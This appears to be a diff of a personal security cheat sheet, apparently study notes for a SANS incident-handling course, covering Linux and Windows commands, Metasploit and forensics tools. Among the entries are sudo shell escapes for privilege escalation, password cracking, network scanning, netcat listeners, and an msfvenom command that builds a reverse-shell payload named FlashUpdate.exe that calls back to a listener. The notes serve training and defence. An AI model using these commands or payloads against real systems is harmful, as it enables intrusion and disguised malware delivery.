@@ -25,6 +25,7 @@
 # Command Line Interface
 ## Linux CLI
 &nbsp;
+&nbsp;
 ### A <!-- omit in toc -->
 #### awk <!-- omit in toc -->
 `awk -F: '{print $1}'` prints the first field when a file is separated by :
@@ -33,13 +34,16 @@
 - `'{print $1}'` prints field 1
   - the number can be swapped out from 0 to however many columns exist when the line is split based on the field separator
 &nbsp;
+&nbsp;
 ### C <!-- omit in toc -->
 #### curl <!-- omit in toc -->
 `curl http://some_website_or_ip` downloads the files located on some website or ip
 &nbsp;
+&nbsp;
 ### D <!-- omit in toc -->
 #### dig <!-- omit in toc -->
 DNS Interrogation tool
+&nbsp;
 &nbsp;
 ### F <!-- omit in toc -->
 #### find <!-- omit in toc -->
@@ -50,6 +54,7 @@ DNS Interrogation tool
   - this can be used for PrivEsc with `sudo` permissions, like so:
     - `sudo find . -exec /bin/bash {} \;`
 &nbsp;
+&nbsp;
 ### G <!-- omit in toc -->
 #### grep <!-- omit in toc -->
 `grep "some string" /path/to/file` looks for some string in file
@@ -58,10 +63,12 @@ DNS Interrogation tool
 - `-i` case insensitive mode
 - `-v` returns the contents of the file _without_ the matching lines
 &nbsp;
+&nbsp;
 ### H <!-- omit in toc -->
 #### head <!-- omit in toc -->
 `head somefile` prints the top lines of the file
 - `-1` through `-20` will print the top _n_ lines of the file, based on what number follows the -
+&nbsp;
 &nbsp;
 ### J <!-- omit in toc -->
 #### john <!-- omit in toc -->
@@ -69,33 +76,41 @@ DNS Interrogation tool
 - `--format=FORMAT` tells john what format the credentials are
 - `--wordlist=/path/to/wordlist.txt` tells john which wordlist to use
 &nbsp;
+&nbsp;
 #### jq <!-- omit in toc -->
 `jq {some_regex_pattern} some_json_file.json` parses the json file and returns key/value pairs that match `some_regex_pattern`
+&nbsp;
 &nbsp;
 ### L <!-- omit in toc -->
 #### less <!-- omit in toc -->
 `less somefile` prints an amount of lines in the file
 &nbsp;
+&nbsp;
 ### M <!-- omit in toc -->
 #### man <!-- omit in toc -->
 `man some_command` shows the manual pages for some_command, if they exist
+&nbsp;
 &nbsp;
 #### masscan <!-- omit in toc -->
 `sudo masscan {NETWORK_ID/CIDR}` scans a large range of IPs very quickly
 - `-p` define the ports to scan
 &nbsp;
+&nbsp;
 #### md <!-- omit in toc -->5sum
 `md5sum some_file` calculates the MD5 sum of some_file
+&nbsp;
 &nbsp;
 ### N <!-- omit in toc -->
 #### nano <!-- omit in toc -->
 launches the nano editor
+&nbsp;
 &nbsp;
 #### netstat <!-- omit in toc -->
 `netstat` shows network statistics
 - `-l`
 - `-n`
 - `-p`
+&nbsp;
 &nbsp;
 #### nmap <!-- omit in toc -->
 `nmap {IP_ADDR or NETWORK_ID/CIDR}` scans the given IP Address or Network range
@@ -115,31 +130,39 @@ nmap 192.168.0.1/24
 - `--script=` allows you to run a specific `nmap` script
   - `dns-brute`
 &nbsp;
+&nbsp;
 ### R <!-- omit in toc -->
 #### recon-ng <!-- omit in toc -->
 OSINT tool
 &nbsp;
+&nbsp;
 #### rpcclient <!-- omit in toc -->
 allows linux to send remote procedure calls to windows machines
+&nbsp;
 &nbsp;
 ### S <!-- omit in toc -->
 #### script <!-- omit in toc -->
 enables logging of the current shell
 &nbsp;
+&nbsp;
 #### sed <!-- omit in toc -->
 `sed "s/somepattern/replacement/" file_or_string` replaces instances of somepattern with replacement 
 &nbsp;
+&nbsp;
 #### smbclient <!-- omit in toc -->
 allows linux to interact with windows smb
+&nbsp;
 &nbsp;
 #### sudo <!-- omit in toc -->
 `sudo ls` "**S**uper **U**ser **DO**". Runs things as root. Commonly used to  PrivEsc.
 - `-l` lists what actions a user is allowed to run with `sudo`
 &nbsp;
+&nbsp;
 ### T <!-- omit in toc -->
 #### tail <!-- omit in toc -->
 `tail somefile` prints the bottom lines of the file
 - `-1` through `-20` will print the bottom _n_ lines of the file, based on what number follows the -
+&nbsp;
 &nbsp;
 #### tcpdump <!-- omit in toc -->
 `sudo tcpdump -i eth0 'src host 192.168.0.1 and dst port 80'`
@@ -151,10 +174,12 @@ It's like wireshark but for CLI. Uses Berkeley Packet Filtering. Needs sudo most
 - `-n` disables name resolution
 - `-v` enables verbose mode (more v = more verbose)
 &nbsp;
+&nbsp;
 ### V <!-- omit in toc -->
 #### vi <!-- omit in toc -->
 Launches the vi editor
 - not sure why you'd ever need this on your own attack platform as you should have `vim` or `nano` installed, but still useful for when you get onto pivot machines that don't have either of those and you need a command-line editor.
+&nbsp;
 &nbsp;
 #### vim <!-- omit in toc -->
 Launches the VI Improved editor
@@ -162,6 +187,7 @@ Launches the VI Improved editor
   - `sudo vi somefile`
   - (once inside the editor, press `[ESC]` and run the following command:)
   - `!/bin/bash`
+&nbsp;
 &nbsp;
 ### W <!-- omit in toc -->
 #### w <!-- omit in toc -->
@@ -171,21 +197,26 @@ Launches the VI Improved editor
 #### whois <!-- omit in toc -->
 DNS interrogation query
 &nbsp;
+&nbsp;
 ### Z <!-- omit in toc -->
 #### zgrep <!-- omit in toc -->
 `zgrep 'somestring' some_compressed_file.gz` looks through a compressed file or archive to find specific text
 &nbsp;
+&nbsp;
 ## Windows CLI
+&nbsp;
 &nbsp;
 ### C <!-- omit in toc -->
 #### certutil <!-- omit in toc -->
 `certutil -hashfile some_file MD5` calculates the MD5 hash of some_file
+&nbsp;
 &nbsp;
 ## D <!-- omit in toc -->
 ### DeepBlue.ps1 <!-- omit in toc -->
 PowerShell Module for Threat Hunting via Windows Event Logs
 `.\DeepBlue.ps1 <event log name> <evtx filename>`
 - [Documentation](https://github.com/sans-blue-team/DeepBlueCLI)
+&nbsp;
 &nbsp;
 ### N <!-- omit in toc -->
 #### net <!-- omit in toc -->
@@ -198,6 +229,7 @@ PowerShell Module for Threat Hunting via Windows Event Logs
   - lists all users
   - `net user USERNAME` lists info about a specific user
 &nbsp;
+&nbsp;
 #### netstat <!-- omit in toc -->
 `netstat` shows network statistics
 - `-a` display all active TCP and UDP connections
@@ -205,9 +237,11 @@ PowerShell Module for Threat Hunting via Windows Event Logs
 - `-o` show the process id is associated with that connection
 - `-b` shows what program is associated with that connection
 &nbsp;
+&nbsp;
 ### S <!-- omit in toc -->
 #### schtasks <!-- omit in toc -->
 - shows all tasks
+&nbsp;
 &nbsp;
 #### Sysinternals <!-- omit in toc -->
 These tools from the Sysinternals library run as CLI. When possible use 64bit versions.
@@ -222,6 +256,7 @@ applications execute interactively.
   - Lists all processes in Tree form, where children are nested under their parent process
 - Strings
   - Prints strings grabbed from the executable binaries.
+&nbsp;
 &nbsp;
 ### W <!-- omit in toc -->
 #### wmic <!-- omit in toc -->
@@ -240,7 +275,9 @@ Useful examples:
 - `wmic process where name="FlashUpdate.exe" list full`
 - `wmic service where name="WpnUserService_5d314e6" list full`
 &nbsp;
+&nbsp;
 ## OS Agnostic CLI
+&nbsp;
 &nbsp;
 ### H <!-- omit in toc -->
 #### hashcat <!-- omit in toc -->
@@ -249,12 +286,14 @@ Useful examples:
 - `-h` shows the help menu (useful for finding which hashing mode you want to use)
 - `-m` sets the hashing mode
 &nbsp;
+&nbsp;
 ### N <!-- omit in toc -->
 #### netcat <!-- omit in toc -->, ncat, nc
 `netcat 192.168.0.2 4444` makes a connection to 192.168.0.2 on port 4444
 - `-lp {PORT}` opens listener on `{PORT}`
 - `-v` turns on verbose mode
 - `-u` forces udp traffic
+&nbsp;
 &nbsp;
 ### W <!-- omit in toc -->
 #### whoami <!-- omit in toc -->
@@ -264,6 +303,7 @@ Useful examples:
 &nbsp;
 # Frameworks
 ## Metasploit
+&nbsp;
 &nbsp;
 ### Automation <!-- omit in toc -->
 Store raw msfconsole commands in `.rc` files and then execute them with `msfconsole -q -r some_rc_file.rc`.
@@ -278,10 +318,12 @@ set LHOST 10.10.75.1
 exploit
 ```
 &nbsp;
+&nbsp;
 ### msfconsole <!-- omit in toc -->
 `msfconsole` launches the console
 #### Arguments <!-- omit in toc -->
 - `-q` launch in quiet mode (slightly faster)
+&nbsp;
 &nbsp;
 #### Commands <!-- omit in toc -->
 - `exploit` / `run`
@@ -298,8 +340,10 @@ exploit
   - sets the exploit
     - `use exploit/windows/smb/psexec`
 &nbsp;
+&nbsp;
 ### meterpreter <!-- omit in toc -->
   - `background` puts the current meterpreter session in the background
+&nbsp;
 &nbsp;
 #### msfvenom <!-- omit in toc -->
 Allows for the creation of specifically packaged and targeted malware.
@@ -307,6 +351,7 @@ Allows for the creation of specifically packaged and targeted malware.
   - `msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=10.10.75.1 lport=4444 -f exe -o ./FlashUpdate.exe`
 &nbsp;
 ---
+&nbsp;
 &nbsp;
 ## Volatility Framework 
 `python vol.py` runs the volatility framework. See 504.1 Lab #3 for more information
@@ -323,6 +368,7 @@ Allows for the creation of specifically packaged and targeted malware.
 #### BeEF <!-- omit in toc -->
 Used for website attacks. Many options and configurations
 &nbsp;
+&nbsp;
 ## Windows GUI Applications
 ### R <!-- omit in toc -->
 #### RegEdit <!-- omit in toc -->
@@ -331,9 +377,11 @@ Registry Viewer
   - `\Run` Starts the program every time someone logs in or system boots (need to figure out which)
   - `\RunOnce` Starts the program only once when someone logs in / system boots (need to figure out which) then removes this key from the registry
 &nbsp;
+&nbsp;
 ### S <!-- omit in toc -->
 #### Services <!-- omit in toc -->.msc
 Service Viewer. Useful for finding malicious services based on signing and privilege level.
+&nbsp;
 &nbsp;
 #### Sysinternals <!-- omit in toc -->
 These tools from the Sysinternals library run as GUI Apps. When possible, use the 64bit versions.
@@ -342,9 +390,11 @@ These tools from the Sysinternals library run as GUI Apps. When possible, use th
 - `Procmon` Monitors just about everything going on in the processes. Filter down by the specific process that's suspicious.
 - `TCPView` Shows all network traffic. Useful to see if a program that shouldn't be making network connections is sending or receiving traffic 
 &nbsp;
+&nbsp;
 ### T <!-- omit in toc -->
 #### Task <!-- omit in toc --> Scheduler
 Built-in windows task viewer. Can be used to see all the tasks and find malicious ones.
+&nbsp;
 &nbsp;
 ## OS Agnostic GUI Applications
 ### S <!-- omit in toc -->
@@ -362,6 +412,7 @@ OSINT tool (WebAPP). Might not be used in CTF but still useful.
 &nbsp;
 # Other Notes and Useful Information
 &nbsp;
+&nbsp;
 ## Network Investigations
 ### Sources <!-- omit in toc -->
 - Network Traffic
@@ -369,6 +420,7 @@ OSINT tool (WebAPP). Might not be used in CTF but still useful.
   - Servers, Routers, Switches
 - Host Devices
   - Workstations
+&nbsp;
 &nbsp;
 ### Challenges <!-- omit in toc -->
 - Data Export
@@ -393,16 +445,20 @@ Bypassing Proxies means 1 of 2 things;
 &nbsp;
 `robotx.txt` is a goldmine when exploiting webapps
 &nbsp;
+&nbsp;
 ## Memory Investigation
 - Virtual Environment ≠ Virtual Machine
 - Make sure memory dumps also come with OS and Version
+&nbsp;
 &nbsp;
 ## Recon, Scanning, and Enumeration
 _"As long as it's in-scope, I'm going to Cheat"_
 \- Mr. Douglas
 &nbsp;
+&nbsp;
 ### Recon <!-- omit in toc -->
 Use Spiderfoot and recon-ng
+&nbsp;
 &nbsp;
 ### OSINT Search-Engine Recon <!-- omit in toc -->
 - Google Dorking (504.2 p43)
